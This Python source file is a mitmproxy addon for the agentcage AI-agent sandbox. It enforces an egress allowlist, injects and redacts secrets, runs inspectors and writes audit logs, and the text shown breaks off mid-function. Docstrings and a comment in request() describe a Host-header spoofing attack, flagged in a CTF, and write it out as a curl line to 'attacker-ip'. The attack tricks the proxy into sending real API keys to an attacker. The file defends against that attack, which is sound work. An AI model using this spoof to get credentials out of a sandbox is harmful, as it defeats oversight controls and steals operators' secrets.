"""agentcage apple-container egress allowlist + audit addon for mitmproxy.

The mitmproxy `--allow-hosts` flag controls *interception scope* (which
hosts get MITMed) but does NOT block non-listed hosts. It just passes
them through unintercepted, which is the opposite of what we want.

This addon enforces a real allowlist: every request's host is checked
against /etc/agentcage/allowlist.txt (one entry per line, subdomains
auto-allowed). Non-matching requests are replied to with a 403 from
mitmproxy itself — the upstream connection is never opened.

For every decision we emit a structured JSON line to
``/var/log/agentcage/audit.jsonl`` (or ``$AGENTCAGE_AUDIT_LOG``), in the
format ``agentcage.audit.AuditEntry.from_dict`` expects — that's what
``agentcage cage audit`` consumes on the host side once the file is
bind-mounted out of the microVM. For successful 2xx responses we also
emit a basic capture record to ``/var/log/agentcage/capture.jsonl`` so
``agentcage cage har`` can produce HAR 1.2 JSON.

This is a leaner audit format than the container backend's
``addon.py`` (no inspector chain, no body capture, no secret-injection
metadata yet — those are tracked as separate items in #120's parity
plan). The fields here are the minimum subset ``AuditEntry`` /
``CaptureFilter`` need to filter and summarize.

The allowlist file is read once at startup; restart the cage to pick up
changes. Empty allowlist means "block everything".
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
from datetime import datetime, timezone

from mitmproxy import ctx, http


ALLOWLIST_PATH = "/etc/agentcage/allowlist.txt"
SECRET_INJECTION_PATH = "/etc/agentcage/secret_injection.json"
PROTOCOL_RELAYS_PATH = "/etc/agentcage/protocol_relays.json"
CAPTURE_CONFIG_PATH = "/etc/agentcage/capture.json"
INSPECTORS_PATH = "/etc/agentcage/inspectors.json"
# Per-cage resolved-secret files; supervisor stage 35 re-stages from
# the host-bind-mounted /run/agentcage/secrets to this acproxy-only path
# (chown 200:200, mode 0400). The cage workload (uid 1000) cannot read
# this dir.
SECRETS_DIR = "/home/acproxy/secrets"
AUDIT_LOG_PATH = os.environ.get(
    "AGENTCAGE_AUDIT_LOG", "/var/log/agentcage/audit.jsonl"
)
CAPTURE_PATH = os.environ.get(
    "AGENTCAGE_CAPTURE", "/var/log/agentcage/capture.jsonl"
)


def _load_allowlist() -> set[str]:
    try:
        with open(ALLOWLIST_PATH) as f:
            return {line.strip() for line in f if line.strip()}
    except OSError:
        return set()


def _host_allowed(host: str, allowed: set[str]) -> bool:
    """Subdomains of allowed hosts are also allowed (matches Lima behaviour).

    e.g. allowlist {"github.com"} accepts host "api.github.com" but not
    "evil-github.com" or "githubcom.example.com".
    """
    h = host.lower()
    for d in allowed:
        d = d.lower()
        if h == d or h.endswith("." + d):
            return True
    return False


def _authoritative_host(flow) -> str | None:
    """Return the hostname we should gate allowlist + secret-injection on.

    The HTTP ``Host`` header (and therefore ``flow.request.pretty_host``,
    which reads it when ``keep_host_header=true`` is set) is fully
    attacker-controlled: a cage workload can open a TCP/TLS connection
    to any IP and send ``Host: api.anthropic.com``. Gating on that would
    let the cage trick the addon into allowlisting and secret-injecting
    requests bound for an attacker-controlled destination.

    The trustworthy alternatives in mitmproxy's transparent mode are:

      * ``flow.client_conn.sni`` — the TLS SNI extension committed to in
        the ClientHello. The cage chose this value, but mitmproxy minted
        a forged cert for THIS name; the cage's TLS stack will reject a
        cert for any other name. Mitmproxy's upstream connection also
        validates the upstream cert against this name (no
        ``ssl_insecure`` set), so a Host header pointing at an
        attacker-controlled IP cannot smuggle traffic out under a real
        upstream's name.
      * ``flow.request.host`` — populated from the SO_ORIGINAL_DST IP
        the iptables REDIRECT preserved. This is the actual destination
        of the TCP connection; in transparent mode it's an IP literal,
        not a hostname.

    We prefer SNI when present (the common case — all agent traffic is
    HTTPS) and fall back to the original-dst IP for plain HTTP. An IP
    will essentially never match the allowlist (which is keyed on
    domain names), so a plain-HTTP request to a non-allowlisted host
    fails closed. Returns ``None`` only when neither is available.
    """
    sni = getattr(getattr(flow, "client_conn", None), "sni", None)
    # mitmproxy types sni as ``str | None`` but historically some
    # paths handed back ``bytes``; normalize defensively. Anything
    # else (a MagicMock from a host-side unit test, an int, ...) is
    # treated as "no SNI" — those flows fall back to the original-dst
    # IP check below.
    if isinstance(sni, bytes):
        try:
            sni = sni.decode("idna")
        except UnicodeError:
            sni = sni.decode("utf-8", "replace")
    if isinstance(sni, str) and sni:
        return sni.lower()
    host = getattr(flow.request, "host", None)
    if isinstance(host, str) and host:
        return host.lower()
    return None


def _host_header_matches_authoritative(flow, auth_host: str) -> bool:
    """True when the request's Host header agrees with the authoritative host.

    The ``Host`` header is what ``pretty_host`` returns when
    ``keep_host_header=true``; it is attacker-controlled. We accept it
    only when it equals ``auth_host`` OR is a subdomain of it (some
    services use a wildcard cert with subdomain-routed virtual hosts).
    A blank/missing header is also accepted (legacy HTTP/1.0 clients
    or origin-form requests where mitmproxy filled host from the
    transparent original-dst).

    A mismatch is the precise attack signature flagged by the CTF
    (``Host: api.anthropic.com`` over a TCP connection whose
    SNI/original-dst is example.com): the caller should block the
    request and refuse to inject secrets.
    """
    header_host = flow.request.pretty_host
    if not header_host:
        return True
    h = header_host.lower()
    a = auth_host.lower()
    return h == a or h.endswith("." + a)


def _load_capture_config() -> dict:
    """Load the cage's capture config baked in at build time.

    Returns an empty dict (= disabled) on missing/malformed file. The
    config shape mirrors ``agentcage.config.CaptureConfig``:
    ``{enable_har, max_body_size, min_action, domains, exclude_domains}``.
    Only ``enable_har`` gates body capture; the rest tune size limits and
    domain filtering (same semantics as the container backend).
    """
    try:
        with open(CAPTURE_CONFIG_PATH) as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except (OSError, ValueError):
        return {}


def _load_secret_injection_rules() -> list[dict]:
    """Load the cage's secret_injection rule list, baked in at build time.

    Each rule is ``{"env": str, "placeholder": str, "inject_to": [str],
    "transform": str, "transform_config": dict}``. The actual secret VALUE
    is read from ``os.environ[env]`` at request time (forwarded by
    ``AppleContainerBackend.start()`` via ``-e``). ``transform`` is
    optional — when set the addon looks the name up in the bundled
    ``transforms`` package and calls ``cls(value, transform_config).
    get_value()`` to mint a derived substitution value (e.g. a fresh
    Google OAuth bearer) instead of using the raw env value verbatim.
    """
    try:
        with open(SECRET_INJECTION_PATH) as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except (OSError, ValueError):
        return []


def _load_protocol_relays() -> list[dict]:
    """Load the cage's ``protocol_relays`` list, baked in at build time.

    Each entry is a YAML-parsed protocol_relays mapping with
    ``name/type/listen/upstream/auth/policy`` keys. The actual
    credential VALUES are NOT in this file (they live alongside
    secret_injection secrets at /home/acproxy/secrets/<env> after
    supervisor stage 35 re-stages them). The addon resolves them
    in ``_seed_relay_secrets_env`` below before constructing each
    relay so the relay's own ``_resolve_credential(scheme:VAR)``
    can read them straight from ``os.environ``.
    """
    try:
        with open(PROTOCOL_RELAYS_PATH) as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except (OSError, ValueError):
        return []


def _build_transform_fn(name: str, secret: str, config: dict):
    """Look up *name* in the bundled transforms registry and bind it.

    Returns a zero-arg callable that yields the substitution value at
    request time (the transform may cache internally). Raises if the
    name is unknown or the transform fails to initialize — the caller
    drops the rule and logs.
    """
    # Lazy import so a rule list with no transforms doesn't pay the
    # cryptography import cost at addon load.
    from transforms import get as _get

    cls = _get(name)
    instance = cls(secret, config)
    return instance.get_value


def _load_inspector_entries() -> list[dict]:
    """Load the cage's inspector chain config (baked at build time).

    Each entry is ``{"name": str, "config": dict}``. Missing file or
    parse failure → empty list (allowlist-only mode, the legacy
    behavior pre-this-PR).
    """
    try:
        with open(INSPECTORS_PATH) as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except (OSError, ValueError):
        return []


# Mirror the container backend's built-in inspector registry. Kept in this
# module (rather than imported from a shared spot) so the cage image only
# needs the inspectors package on sys.path — no extra Python deps to
# stage. The container backend's addon.py is the source of truth for the
# ordering rationale (cheap+high-reject inspectors first); we keep it
# identical here so behavior is byte-for-byte the same across backends.
def _builtin_inspectors_map():
    """Lazy-imported registry of built-in inspectors by name.

    Returns ``{name: Inspector_subclass}``. Kept lazy so addon import
    doesn't fail when ``inspectors:`` is empty (the common case) and
    the inspectors package happens to be unavailable for any reason.
    Imports are cheap and only paid once per addon load.
    """
    from inspectors.body_size import BodySizeInspector
    from inspectors.content_type import ContentTypeInspector
    from inspectors.domain import DomainInspector
    from inspectors.entropy import EntropyInspector
    from inspectors.secrets import SecretsInspector
    return {
        "domain": DomainInspector,
        "secrets": SecretsInspector,
        "body-size": BodySizeInspector,
        "entropy": EntropyInspector,
        "content-type": ContentTypeInspector,
    }


class AllowlistAddon:
    def __init__(self) -> None:
        self.allowed = _load_allowlist()
        ctx.log.info(
            f"[agentcage] allowlist loaded: {sorted(self.allowed) or '(empty — block all)'}"
        )
        self.injection_rules = _load_secret_injection_rules()
        # Resolve secret values from the environment ONCE at startup —
        # later os.environ changes won't propagate. Skip rules whose
        # env var isn't set (the backend logs a warning at start, and
        # the placeholder simply doesn't get substituted).
        #
        # Rules with a non-empty ``transform`` go through the bundled
        # transforms registry (data/proxy/transforms, staged into
        # /opt/agentcage/transforms by stage_build_context). The
        # ``transform_fn`` callable replaces ``value`` at substitution
        # time so the raw env-passed credential never lands on the wire
        # — same contract as the container backend's SecretInjector.
        self._resolved_secrets: list[dict] = []
        for rule in self.injection_rules:
            env_name = rule.get("env", "")
            # Read the resolved value from /home/acproxy/secrets/<env>
            # (re-staged by supervisor stage 35 from the host bind mount).
            # Falls back to os.environ for backward compat with cages
            # last started under 0.21.0 or earlier (which env-passed the
            # cleartext value); on the file path, mitmproxy's own env
            # never holds the raw secret.
            value = ""
            secret_file = os.path.join(SECRETS_DIR, env_name)
            try:
                with open(secret_file) as f:
                    value = f.read()
            except OSError:
                value = os.environ.get(env_name, "")
            if not value:
                continue
            transform_name = rule.get("transform", "") or ""
            transform_fn = None
            if transform_name:
                transform_config = rule.get("transform_config") or {}
                try:
                    transform_fn = _build_transform_fn(
                        transform_name, value, transform_config
                    )
                except Exception as exc:
                    ctx.log.warn(
                        f"[agentcage] secret_injection transform "
                        f"{transform_name!r} for {env_name!r} failed to "
                        f"initialize: {exc} — skipping rule"
                    )
                    continue
            self._resolved_secrets.append({
                "env": env_name,
                "placeholder": rule["placeholder"],
                "value": value,
                "inject_to": [d.lower() for d in (rule.get("inject_to") or [])],
                "transform": transform_name,
                "transform_fn": transform_fn,
            })
        if self._resolved_secrets:
            ctx.log.info(
                f"[agentcage] secret injection: "
                + ", ".join(
                    f"{r['env']}"
                    + (f"({r['transform']})" if r["transform"] else "")
                    for r in self._resolved_secrets
                )
            )
        # Inspector chain — each entry is dispatched through the bundled
        # ``inspectors`` registry (built-in by name, or a custom Python
        # file via ``path``). Same shape as the container backend's
        # addon.py ``_load_custom_inspectors``. A rule that fails to
        # instantiate is dropped with a warning so a single bad config
        # doesn't take down the whole proxy.
        self.inspectors: list = []
        self._load_inspectors()
        if self.inspectors:
            ctx.log.info(
                "[agentcage] inspectors loaded: "
                + ", ".join(i.name for i in self.inspectors)
            )
        self._audit_fh = self._open_log(AUDIT_LOG_PATH)
        # HAR body capture — when enabled, the shared CaptureWriter writes
        # per-flow entries with inbound+outbound request/response snapshots
        # (subject to max_body_size + binary-skip). Disabled (default), the
        # addon falls back to a lean headers-only capture record so
        # ``cage har`` still works in the no-bodies mode that shipped pre-
        # this PR. ``capture.py`` is staged next to this file by
        # ``stage_build_context`` and lives at /opt/agentcage/capture.py —
        # mitmproxy's script loader puts that dir on sys.path.
        self._capture_cfg = _load_capture_config()
        self._capture_writer = None
        if self._capture_cfg.get("enable_har"):
            try:
                from capture import CaptureWriter  # type: ignore[import-not-found]
                self._capture_writer = CaptureWriter(
                    self._capture_cfg, CAPTURE_PATH,
                )
                ctx.log.info(
                    "[agentcage] HAR body capture enabled "
                    f"(max_body_size={self._capture_cfg.get('max_body_size')}, "
                    f"domains={self._capture_cfg.get('domains') or '(any)'})"
                )
            except Exception as exc:  # pragma: no cover — import surprise
                ctx.log.warn(
                    f"[agentcage] CaptureWriter init failed: {exc} — "
                    "falling back to headers-only capture"
                )
                self._capture_writer = None
        # Headers-only fallback file handle. When the CaptureWriter is
        # active it owns the capture.jsonl path; otherwise we keep the
        # legacy lean entries so ``cage har`` doesn't regress for cages
        # that haven't opted into body capture.
        self._capture_fh = (
            None if self._capture_writer is not None
            else self._open_log(CAPTURE_PATH)
        )
        # Partial-snapshot staging for the request→response handoff.
        # Mirrors the container backend's addon.py ``_cap_pending`` —
        # the four perspectives (inbound/outbound × request/response) are
        # captured at four different points in the flow lifecycle, then
        # joined into a single capture.jsonl entry when the response
        # completes. Keyed by flow.id; popped on response or on error.
        self._cap_pending: dict[str, dict] = {}

        # Protocol relays (IMAP, SMTP, ...) — loaded here, instantiated
        # in the ``running()`` hook once the mitmproxy asyncio loop is
        # live. We can't start TCP listeners from __init__ because the
        # loop may not exist yet (mitmproxy creates it during its own
        # startup). The relay objects themselves live in
        # ``self._relays`` so the ``done()`` hook can drain them.
        self._relay_entries: list[dict] = _load_protocol_relays()
        self._relays: list = []

    def _load_inspectors(self) -> None:
        """Instantiate the cage's inspector chain from inspectors.json.

        Built-in name → look up in the bundled registry. Custom Python
        file (``path:``) → load via the shared util that constrains the
        path to /etc/agentcage/inspectors. Bad entries are skipped with
        a warning rather than crashing the addon — the operator sees
        the warning in ``cage logs`` and the cage keeps running.
        """
        entries = _load_inspector_entries()
        if not entries:
            return
        try:
            registry = _builtin_inspectors_map()
        except Exception as exc:  # pragma: no cover — registry import is staged in CI
            ctx.log.warn(
                f"[agentcage] inspector registry import failed: {exc} — "
                f"chain disabled"
            )
            return
        for entry in entries:
            if not isinstance(entry, dict):
                continue
            name = entry.get("name", "")
            cfg = entry.get("config") or {}
            path = entry.get("path")
            try:
                if path:
                    from inspectors.util import load_inspector_from_file
                    inspector = load_inspector_from_file(path)
                elif name in registry:
                    inspector = registry[name]()
                else:
                    ctx.log.warn(
                        f"[agentcage] unknown inspector {name!r} — skipping"
                    )
                    continue
                inspector.configure(cfg)
            except Exception as exc:
                ctx.log.warn(
                    f"[agentcage] inspector {name!r} failed to load: "
                    f"{exc} — skipping"
                )
                continue
            self.inspectors.append(inspector)

    def _build_inspection_context(self, flow: http.HTTPFlow):
        """Construct an ``InspectionContext`` for the inspector chain.

        Mirrors ``Agentcage._build_context`` in the container backend so
        inspector behavior is identical across backends. Body entropy is
        computed once here (the container backend caches it on the
        context for inspectors that need it).
        """
        from inspectors.base import InspectionContext
        from inspectors.util import shannon_entropy

        body_bytes = flow.request.content
        try:
            body_text = flow.request.get_text(strict=False)
        except (UnicodeDecodeError, ValueError):
            body_text = None
        content_type = flow.request.headers.get("content-type", "")
        body_size = len(body_bytes) if body_bytes else 0
        body_ent = shannon_entropy(body_bytes) if body_bytes else None
        return InspectionContext(
            url=flow.request.pretty_url,
            host=flow.request.pretty_host,
            method=flow.request.method,
            headers=list(flow.request.headers.items(multi=True)),
            content_type=content_type,
            body_bytes=body_bytes,
            body_text=body_text,
            body_size=body_size,
            body_entropy=body_ent,
        )

    def _run_inspectors(self, flow: http.HTTPFlow) -> list:
        """Run the inspector chain on *flow* and return the result list.

        Each ``InspectionResult`` carries action ("block"|"flag"),
        severity, reason, and inspector name. Short-circuits on the
        first ``block`` so an expensive inspector after a cheap reject
        never runs. Same semantics as the container backend's
        ``request()`` hook.
        """
        if not self.inspectors:
            return []
        results: list = []
        try:
            ctx_obj = self._build_inspection_context(flow)
        except Exception as exc:
            ctx.log.warn(f"[agentcage] inspection context build failed: {exc}")
            return []
        for inspector in self.inspectors:
            try:
                result = inspector.inspect_request(ctx_obj)
            except Exception as exc:
                ctx.log.warn(
                    f"[agentcage] inspector {inspector.name!r} raised: "
                    f"{exc} — skipping"
                )
                continue
            if result is None:
                continue
            results.append(result)
            ctx_obj.prior_results.append(result)
            if result.action == "block":
                break
        return results

    @staticmethod
    def _host_matches_inject_to(host: str, inject_to: list[str]) -> bool:
        """Mirror the host-scope rule used by ``_maybe_inject``.

        Empty ``inject_to`` means "any host" — the rule applies anywhere.
        Otherwise the request/response host must equal or be a subdomain
        of an entry. Same suffix semantics as ``_host_allowed`` but kept
        rule-scoped so an unrelated allowlisted host that happens to echo
        a substring matching a secret isn't redacted.
        """
        if not inject_to:
            return True
        return any(host == d or host.endswith("." + d) for d in inject_to)

    def _maybe_inject(
        self, flow: http.HTTPFlow
    ) -> tuple[list[str], dict[str, str]]:
        """Substitute placeholders in request headers/body for matching hosts.

        Returns ``(injected_envs, transforms_by_env)``:
          * ``injected_envs`` — env names that had at least one
            substitution performed (audit ``secrets_injected``)
          * ``transforms_by_env`` — mapping ``env → transform_name`` for
            the subset of those rules that ran through a transform (e.g.
            ``{"GCP_SA_KEY": "google-jwt-bearer"}``); audit
            ``secret_transforms``

        When a rule has a transform configured, the transform's
        ``get_value()`` is called per request — the transform itself is
        responsible for caching (google-jwt-bearer caches the minted
        access token until expiry). If the transform raises, the rule is
        skipped and the placeholder is left in place so the upstream
        request fails closed instead of leaking the raw credential.

        The host used to match ``inject_to`` is the **authoritative**
        host (TLS SNI / original-dst IP), NOT the attacker-controlled
        Host header — same reasoning as the ``request()`` allowlist
        gate. Without this, a cage could open to attacker-IP, claim
        ``Host: api.anthropic.com``, and have the addon inject the real
        ANTHROPIC_API_KEY into a request bound for the attacker. The
        ``request()`` hook already blocks Host/SNI mismatches before
        reaching this code path; this is defense-in-depth in case any
        future caller invokes ``_maybe_inject`` outside that gate.
        """
        auth_host = _authoritative_host(flow)
        host = (auth_host or flow.request.pretty_host).lower()
        injected: list[str] = []
        transforms: dict[str, str] = {}
        for rule in self._resolved_secrets:
            if not self._host_matches_inject_to(host, rule["inject_to"]):
                continue
            placeholder = rule["placeholder"]
            transform_fn = rule.get("transform_fn")
            if transform_fn is not None:
                try:
                    value = transform_fn()
                except Exception as exc:
                    ctx.log.warn(
                        f"[agentcage] secret_injection transform "
                        f"{rule['transform']!r} for {rule['env']!r} "
                        f"failed at request time: {exc} — leaving "
                        f"placeholder in place"
                    )
                    continue
            else:
                value = rule["value"]
            replaced_any = False
            # Headers
            for name, val in list(flow.request.headers.items()):
                if placeholder in val:
                    flow.request.headers[name] = val.replace(placeholder, value)
                    replaced_any = True
            # Body — only attempt if it's text-ish; binary bodies passed
            # through unchanged. Skip if the placeholder isn't there to
            # avoid round-tripping the body through .text.
            try:
                body_text = flow.request.get_text(strict=False)
            except (UnicodeDecodeError, ValueError):
                body_text = None
            if body_text and placeholder in body_text:
                flow.request.set_text(body_text.replace(placeholder, value))
                replaced_any = True
            if replaced_any:
                injected.append(rule["env"])
                if rule["transform"]:
                    transforms[rule["env"]] = rule["transform"]
        return injected, transforms

    def _maybe_redact(self, flow: http.HTTPFlow) -> list[str]:
        """Replace real secret values with placeholders on inbound responses.

        Mirror of ``_maybe_inject`` for the response path: for every rule
        whose ``inject_to`` allows this host, scan response headers and
        text body for the raw secret value and put the placeholder back
        in its place. This means the cage never sees the secret bytes
        even if the upstream echoes them back (e.g. ``httpbin/headers``
        reflecting the ``X-Echo`` header we substituted on the way out).

        Skip rules with an empty ``value`` (env var unset at startup) —
        ``self._resolved_secrets`` already filters those out, but the
        check is cheap and defensive.

        Binary response bodies (images, archives) are passed through
        unchanged: ``get_text(strict=False)`` raises on undecodable
        bytes, same defensive pattern as ``_maybe_inject``.

        Returns the list of env names that had at least one substitution
        performed; the audit entry surfaces this as `secrets_redacted`.
        """
        if flow.response is None:
            return []
        # Redaction is keyed by ``inject_to``; use the same authoritative
        # host (SNI / original-dst) as ``_maybe_inject`` so a request that
        # was injected for host X has its response scanned for host X's
        # secrets — and so a spoofed Host header can't cause us to redact
        # the wrong rule's secret on an unrelated upstream's response.
        auth_host = _authoritative_host(flow)
        host = (auth_host or flow.request.pretty_host).lower()
        redacted: list[str] = []
        # Sort longest value first so a secret that is a substring of
        # another secret doesn't leave a partial leak behind.
        sorted_rules = sorted(
            self._resolved_secrets,
            key=lambda r: len(r["value"]),
            reverse=True,
        )
        for rule in sorted_rules:
            value = rule["value"]
            if not value:  # defensive — _resolved_secrets already filters
                continue
            if not self._host_matches_inject_to(host, rule["inject_to"]):
                continue
            placeholder = rule["placeholder"]
            replaced_any = False
            # Response headers
            for name, val in list(flow.response.headers.items()):
                if value in val:
                    flow.response.headers[name] = val.replace(value, placeholder)
                    replaced_any = True
            # Response body — text only; binary bodies pass through.
            try:
                body_text = flow.response.get_text(strict=False)
            except (UnicodeDecodeError, ValueError):
                body_text = None
            if body_text and value in body_text:
                flow.response.set_text(body_text.replace(value, placeholder))
                replaced_any = True
            if replaced_any:
                redacted.append(rule["env"])
        return redacted

    @staticmethod
    def _open_log(path: str):
        """Append-open ``path``; return None and log a warning on failure.

        ``/var/log/agentcage`` is bind-mounted from the host (mode 1777)
        on apple-container, so the open should succeed even though the
        mitmproxy process runs as uid 200. Tests can point both paths
        at /dev/null via the env vars.
        """
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            return open(path, "a", buffering=1)  # line-buffered
        except OSError as exc:  # pragma: no cover — virtiofs surprise
            ctx.log.warn(f"[agentcage] cannot open {path}: {exc}")
            return None

    def _write(self, fh, entry: dict) -> None:
        if fh is None:
            return
        try:
            fh.write(json.dumps(entry) + "\n")
        except OSError as exc:  # pragma: no cover
            ctx.log.warn(f"[agentcage] write failed: {exc}")

    def _audit(self, entry: dict) -> None:
        # Mirror entries to stderr so they also surface in `container logs`
        # (same pattern container's addon.py uses for the journalctl path).
        print(json.dumps(entry), file=sys.stderr, flush=True)
        self._write(self._audit_fh, entry)

    def request(self, flow: http.HTTPFlow) -> None:
        # Resolve the AUTHORITATIVE hostname (TLS SNI in transparent
        # mode, falling back to the SO_ORIGINAL_DST IP) and use it for
        # every security decision below. ``flow.request.pretty_host``
        # reads the HTTP Host header when ``keep_host_header=true`` is
        # set on the proxy — that's attacker-controlled by the cage
        # workload (it owns the bytes on the wire) and must not gate
        # the allowlist or secret injection. See ``_authoritative_host``.
        auth_host = _authoritative_host(flow)
        header_host = flow.request.pretty_host
        # ``host`` in the audit entry reflects what the cage claimed
        # (Host header), falling back to the authoritative host when the
        # cage didn't send one — matches the legacy field shape.
        # ``authoritative_host`` is the trustworthy value we actually
        # gated on; ``host_mismatch`` (set below) flags the attack
        # pattern.
        host = header_host or auth_host or ""
        now = datetime.now(timezone.utc).isoformat()

        entry: dict = {
            "ts": now,
            "direction": "outbound",
            "method": flow.request.method,
            "host": host,
            "authoritative_host": auth_host,
            "url": flow.request.pretty_url,
            "path": flow.request.path,
            "port": flow.request.port,
            "source": "apple-container",
            "inspectors": [],
            "secrets_injected": [],
            "secrets_redacted": [],
        }

        # Block the spoofing attack first — a mismatch between the
        # Host header (what the cage claims) and the authoritative
        # host (where the bytes actually go) is the exact CTF F1
        # signature: ``curl https://attacker-ip/ -H 'Host: api.anthropic.com'``
        # routed through original-dst to attacker-ip. Refuse to
        # forward and refuse to inject any secret.
        if (
            auth_host is not None
            and not _host_header_matches_authoritative(flow, auth_host)
        ):
            reason = (
                f"host-header-spoof: Host {header_host!r} does not match "
                f"authoritative host {auth_host!r}"
            )
            ctx.log.warn(
                f"[agentcage] BLOCK (host-header spoof) "
                f"{flow.request.method} Host={header_host!r} "
                f"SNI/dst={auth_host!r}"
            )
            entry["decision"] = "blocked"
            entry["reason"] = reason
            entry["host_mismatch"] = True
            self._audit(entry)
            flow.response = http.Response.make(
                403,
                json.dumps(
                    {
                        "blocked": True,
                        "reason": reason,
                        "host": header_host,
                        "authoritative_host": auth_host,
                        "by": "agentcage",
                    }
                ).encode(),
                {"Content-Type": "application/json"},
            )
            return

        # Past the spoof check — use the authoritative host for the
        # allowlist gate so an unset/missing Host header doesn't let
        # a non-allowlisted destination through.
        gate_host = auth_host or header_host

        if _host_allowed(gate_host, self.allowed):
            # HAR body capture: snap INBOUND request BEFORE injection (so
            # the inbound view shows the placeholders the cage actually
            # wrote on the wire, not the upstream-visible substituted
            # value). This mirrors the container backend's pattern.
            cap_inbound_req = None
            if self._capture_writer is not None:
                try:
                    cap_inbound_req = self._capture_writer.snapshot_request(flow)
                except Exception as exc:  # pragma: no cover
                    ctx.log.warn(
                        f"[agentcage] capture inbound-request snapshot failed: {exc}"
                    )

            # Run the inspector chain AFTER the host-allowlist gate but
            # BEFORE secret injection — same ordering as the container
            # backend's addon.py so inspectors see placeholders, not
            # real secret values. The first ``block`` result short-
            # circuits via _run_inspectors; flagged results travel
            # through to the audit entry but don't 403 the request.
            inspector_results = self._run_inspectors(flow)
            inspector_entries = [
                {
                    "name": r.inspector,
                    "action": r.action,
                    "reason": r.reason,
                    "severity": r.severity,
                }
                for r in inspector_results
            ]
            entry["inspectors"] = inspector_entries
            blocked = next(
                (r for r in inspector_results if r.action == "block"), None
            )
            if blocked is not None:
                reason = blocked.reason
                ctx.log.info(
                    f"[agentcage] BLOCK (inspector {blocked.inspector}) "
                    f"{flow.request.method} {host}"
                )
                entry["decision"] = "blocked"
                entry["reason"] = reason
                self._audit(entry)
                flow.response = http.Response.make(
                    403,
                    json.dumps(
                        {
                            "blocked": True,
                            "reason": reason,
                            "host": host,
                            "by": "agentcage",
                        }
                    ).encode(),
                    {"Content-Type": "application/json"},
                )
                return

            # Apply secret injection BEFORE the upstream request goes out.
            # Substitutions happen in place; we record the env names in
            # the audit entry so the operator can see what was swapped.
            # `secret_transforms` is a sibling field (mapping env →
            # transform name) — present only when at least one rule ran
            # through a transform like google-jwt-bearer, so the operator
            # can distinguish raw-env substitution from derived-value
            # substitution at audit time.
            injected, transforms = self._maybe_inject(flow)
            flagged = [r for r in inspector_results if r.action == "flag"]
            entry["decision"] = "flagged" if flagged else "allowed"
            if flagged:
                entry["reason"] = "; ".join(r.reason for r in flagged)
            else:
                entry["reason"] = "domain-allowlist"
            entry["secrets_injected"] = injected
            if transforms:
                entry["secret_transforms"] = transforms
            self._audit(entry)

            # Snap OUTBOUND request AFTER injection (the real bytes on
            # the wire — secrets included). Stage both snapshots for the
            # response hook to complete; the entry isn't written until
            # we have all four perspectives.
            if cap_inbound_req is not None and self._capture_writer is not None:
                try:
                    cap_outbound_req = self._capture_writer.snapshot_request(flow)
                except Exception as exc:  # pragma: no cover
                    ctx.log.warn(
                        f"[agentcage] capture outbound-request snapshot failed: {exc}"
                    )
                    return
                self._cap_pending[flow.id] = {
                    "direction": "outbound",
                    "decision": "allowed",
                    "host": host,
                    "method": flow.request.method,
                    "path": flow.request.path,
                    "inbound_req": cap_inbound_req,
                    "outbound_req": cap_outbound_req,
                }
            return

        ctx.log.info(f"[agentcage] BLOCK {flow.request.method} {host}")
        reason = "domain-allowlist: host not in cage allowlist"
        entry["decision"] = "blocked"
        entry["reason"] = reason
        self._audit(entry)
        # JSON body to match the container backend's 403 shape exactly
        # (src/agentcage/data/proxy/addon.py — `{"blocked": true, "reason":
        # ..., "host": ..., "by": "agentcage"}`). Same Content-Type
        # (application/json) so CLI tools that switch on it work the same
        # way across backends.
        flow.response = http.Response.make(
            403,
            json.dumps(
                {
                    "blocked": True,
                    "reason": reason,
                    "host": host,
                    "by": "agentcage",
                }
            ).encode(),
            {"Content-Type": "application/json"},
        )

    def response(self, flow: http.HTTPFlow) -> None:
        """Redact real secret values back to placeholders, then capture.

        Two jobs:

        1. **Redact** any rule's raw secret value that appears in the
           response headers or text body and put the placeholder back.
           This is the inbound complement of ``_maybe_inject``: the cage
           never sees the secret bytes even if the upstream echoes them
           back (e.g. ``httpbin/headers`` reflecting the ``X-Echo``
           header we substituted on the way out). When at least one
           substitution happens, an audit line with ``direction:
           "inbound"`` is emitted so the operator can see which env
           names were redacted on which host.

        2. **Capture** the (now-redacted) response into capture.jsonl
           for ``agentcage cage har``. Capture runs after redaction so
           HAR exports never contain raw secret values. Only responses
           we actually proxied get captured — locally-synthesized 403s
           from the request hook are skipped via the ``"by":
           "agentcage"`` marker check.
        """
        if flow.response is None:
            return
        # If we already 403ed in `request`, the response is one we
        # constructed locally — no upstream bytes to redact, no point
        # re-capturing. Match on the unique `"by": "agentcage"` marker
        # in our JSON body so the check stays robust against accidental
        # Content-Type changes.
        if (
            flow.response.status_code == 403
            and flow.response.content
            and b'"by": "agentcage"' in flow.response.content
        ):
            # Drop any half-staged capture for a flow we 403'd in
            # response (shouldn't happen — `request()` returns early on
            # block — but defensive).
            self._cap_pending.pop(flow.id, None)
            return

        # ── HAR body capture: snap OUTBOUND response BEFORE redaction ──
        # Real upstream bytes; staged into pending so we can render the
        # outbound (wire) view later. snapshot_response() handles size
        # cap + binary-skip itself (matches container backend behavior).
        cap_outbound_resp = None
        pending = self._cap_pending.get(flow.id)
        if self._capture_writer is not None and pending is not None:
            try:
                cap_outbound_resp = self._capture_writer.snapshot_response(flow)
            except Exception as exc:  # pragma: no cover
                ctx.log.warn(
                    f"[agentcage] capture outbound-response snapshot failed: {exc}"
                )

        # Redact BEFORE inbound capture so the inbound view never sees raw values.
        redacted = self._maybe_redact(flow)
        if redacted:
            host_lc = flow.request.pretty_host
            self._audit({
                "ts": datetime.now(timezone.utc).isoformat(),
                "direction": "inbound",
                "method": flow.request.method,
                "host": host_lc,
                "url": flow.request.pretty_url,
                "path": flow.request.path,
                "port": flow.request.port,
                "source": "apple-container",
                "inspectors": [],
                "secrets_injected": [],
                "secrets_redacted": redacted,
                "decision": "allowed",
                "reason": "secret-redaction",
                "status": flow.response.status_code,
            })

        # ── HAR body capture: write the joined entry ──
        # We have all four perspectives now (inbound_req/outbound_req
        # from request(); cap_outbound_resp pre-redaction; snap the
        # inbound response after redaction). Apply domain + min_action
        # filtering via the CaptureWriter's own gate so the same rules
        # work across backends.
        if (
            self._capture_writer is not None
            and pending is not None
            and cap_outbound_resp is not None
        ):
            self._cap_pending.pop(flow.id, None)
            try:
                if self._capture_writer.should_capture(
                    pending["decision"], pending["host"],
